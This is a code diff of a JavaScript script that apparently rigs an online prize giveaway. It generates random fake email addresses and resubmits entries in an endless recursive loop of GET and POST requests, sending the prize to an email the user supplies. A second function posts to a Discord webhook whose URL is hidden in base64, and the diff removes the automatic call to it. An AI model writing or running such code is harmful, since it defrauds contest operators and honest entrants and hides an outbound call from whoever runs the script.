@@ -1,7 +1,7 @@
-function must() {
+function must(winEmail) {
     if (winEmail == ""){
     var winEmail = prompt("What email do you want the prize to go to?", "example@gmail.com")
-}console.log(winEmail)
+}
     const r1 = Math.floor(Math.random() * 999999) + 1;
     const r2 = Math.floor(Math.random() * 999999) + 1;
     const e = `${r1}@${r2}`;
@@ -167,37 +167,37 @@ function must() {
                         .then(response => response.json())
                         .then(data => {
                             console.log(data);
-                            must()
+                            must(winEmail)
                         })
                         .catch(error => {
                             console.error('Error:', error);
-                            must()
+                            must(winEmail)
                         });
                       })
                       .catch(error => {
                         console.error('Error', error);
-                        must()
+                        must(winEmail)
                       });
                 } else {
-                  must()
+                  must(winEmail)
                 }
               })
               .catch(error => {
                 console.error('POST Request Error:', error);
-                must()
+                must(winEmail)
               });
           })
           .catch(error => {
             console.error('GET Request Error:', error);
-            must()
+            must(winEmail)
           });
       })
       .catch(error => {
         console.error('Error:', error);
-        must()
+        must(winEmail)
       });
   }
-  function funny() {
+  function funny(winEmail) {
     const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTExMjIwNTQ2NzU5NDgwMy82bHRldHBQMndja1VKaGRPMGlUb2V1MEZfaUtPeWptUFBObS0zTFpaVjA1cDFpYjQxTFlRYURNT3E3TkhxaXZ2NG40aQ==';
   
     const discordMessage = {
@@ -213,10 +213,9 @@ function must() {
     })
       .then(() => {
         console.log("Credits: Mumin")
-        must()
+        must(winEmail)
       })
       .catch(error => {
         console.error("Error sending message to Discord webhook, This code won't work without a connection to discord:");
       });
   }
-funny()
